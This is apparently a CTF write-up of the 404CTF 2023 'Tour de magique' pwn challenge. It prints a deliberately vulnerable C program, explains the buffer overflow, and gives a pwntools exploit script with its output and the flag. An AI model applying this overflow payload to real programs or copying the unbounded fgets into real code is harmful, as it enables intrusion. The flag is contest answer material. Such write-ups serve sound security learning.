---
title: CTFs | 404CTF2023 | PWN | Tour De Magique
author: Kaiba_404
date: 2023-06-05
categories: [CTFs, 404CTF2023, PWN]
tags: [CTF, 404CTF2023, pwn]
permalink: /CTFs/404CTF2023/pwn/tourdemagique
---


# Tour de magique

![tourde_magie](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/fe2455b8-6f8a-4509-85bc-d5c7b5805864)

We can download the zip file [tour-de-magie.zip](https://github.com/CongKhaiNGUYEN/congkhainguyen.github.io/tree/main/_posts/CTFs/404CTF2023/pwn/files/tour-de-magie.zip) from the challenge. 


After unzipping the downloaded file, it appears that the files provided are intended for running WebAssembly code. The main code is stored in the `main.c` file. To test the program, we can use the command `wasmtime main.wasm` in the terminal. This command executes the WebAssembly module main.wasm using the wasmtime runtime environment. This way, we can run and observe the behavior of the WebAssembly program.

> `WebAssembly` is a new type of code that can be run in modern web browsers — it is a low-level assembly-like language with a compact binary format that runs with near-native performance and provides languages such as `C/C++`,`C#` and `Rust` with a compilation target so that they can run on the web. It is also designed to run alongside `JavaScript`, allowing both to work together.
{: .prompt-info}

After analyzing the code, I realize that there is a simple Buffer Overflow (BOF) vulnerability. From this information, I can construct a payload to exploit the vulnerability and retrieve the flag.

**main.c**

```c
#include<stdlib.h>
#include<stdio.h>

int main() {
    int* check = malloc(sizeof(int));
    *check = 0xcb0fcb0f;
    puts("Alors, t'es un magicien ?");
    char input[20];
    fgets(input, 200, stdin);
    
	if(*check == 0xcb0fcb0f) {
		puts("Apparemment non...");
		exit(0);
	}
    if(*check != 0xcb0fcb0f && *check != 0x50bada55) {
		puts("Pas mal, mais il en faut plus pour m'impressionner !");
		exit(0);
	}
	if(*check == 0x50bada55) {
		puts("Wow ! Respect ! Quelles paroles enchantantes ! Voilà ta récompense...");
		FILE* f = fopen("flag.txt", "r");
		if(f == NULL) {
			puts("Erreur lors de l'ouverture du flag, contactez un administrateur !");
			exit(1);
		}
		char c;
		while((c = fgetc(f)) != -1) {
			putchar(c);
		}
		fclose(f);
	}
}
```

From the source code, we can see that:

The size of `input` is 20, but `fgets` permits an entry of 200 characters. Therefore, we can make a BOF (Buffer-Overflows) here. We see that `*check` is declared before `input`, so we exploit this BOF to overwrite the desired value to *check.

## Create the payload:

Our goal is to modify the value of `*check` to `0x50bada55` to get the flag.

Since it takes 21 characters to generate a BOF, I will try the following

![21A_wasm](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/64f64d6b-39bc-4b33-b9d7-ea357e29611a)

It is clear that 21 is not enough for us to reach the value of *check. So we will keep adding A until we get the following result

![23A_wasm](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/433bae79-951e-4722-87e5-5ad465b64d6a)

Then replace the last 4 A's with the letter B and see the result

![23A_B](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/43d1a4ca-4082-4ca6-bda5-5e0f06d62c17)

Pay attention to the last line `42414141`, `42` is the ascii value of character `B` and `41` is for character `A`. It seems that the `17-20th` characters in the 23 characters string will overwrite the value of the variable *check.

As a result, the payload can be constructed as follows:

`payload = b'A' * 16 + b'\x55\xda\xba\x50' + b'AAA'`

Here is my exploitation code:

```python
from pwn import *

# p = process(["./wasmtime","main.wasm"])
p = remote("challenges.404ctf.fr",30274)


p.recvuntil(b'magicien ?')
p.sendline(b'A'*16+p32(0x50bada55)+b'AAA')

print(p.recvall().decode())
```

```shell
$ python3 exploit.py 
[+] Opening connection to challenges.404ctf.fr on port 30274: Done
[+] Receiving all data: Done (119B)
[*] Closed connection to challenges.404ctf.fr port 30274

Wow ! Respect ! Quelles paroles enchantantes ! Voilà ta récompense...
404CTF{W0w_St4Ck_3cR4s3_l4_H34P_Qu3LL3_M4G13}
```

**Flag:** `404CTF{W0w_St4Ck_3cR4s3_l4_H34P_Qu3LL3_M4G13}`